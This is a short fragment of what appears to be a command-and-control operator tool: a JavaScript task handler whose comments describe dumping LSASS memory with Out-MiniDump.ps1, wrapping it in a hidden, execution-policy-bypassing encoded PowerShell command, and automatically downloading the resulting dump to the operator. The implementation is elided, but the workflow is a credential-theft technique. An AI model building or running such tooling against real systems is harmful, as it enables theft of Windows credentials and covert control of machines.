// LSASS Minidump Task Handler
// The operator CLI reads Out-MiniDump.ps1, appends the invocation targeting lsass,
// UTF-16LE base64 encodes the script, and stores the full
// 'powershell -w hidden -ep bypass -EncodedCommand <b64>' string as 'command'.
// After completion, the CLI automatically downloads the .dmp file.
export class TaskHandler {
  ...
  getTask = async function (req, res) {
    ...
    const display      = `PS: Out-MiniDump (lsass)`
